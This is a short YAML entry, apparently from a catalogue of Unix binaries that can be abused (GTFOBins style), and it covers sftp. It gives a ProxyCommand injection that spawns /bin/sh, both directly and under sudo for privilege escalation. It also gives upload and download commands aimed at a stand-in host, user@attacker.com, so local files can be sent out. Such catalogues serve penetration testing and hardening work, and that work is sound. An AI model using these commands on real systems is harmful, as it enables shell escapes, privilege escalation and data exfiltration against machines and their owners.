---
functions:
  shell:
    - code: |
        sftp -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
  file-upload:
    - description: Send local file to a SSH server.
      code: |
        RHOST=user@attacker.com
        sftp $RHOST
        put file_to_send file_to_save
  file-download:
    - description: Fetch a remote file from a SSH server.
      code: |
        RHOST=user@attacker.com
        sftp $RHOST
        get file_to_get file_to_save
  sudo:
    - code: |
        sftp -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
---
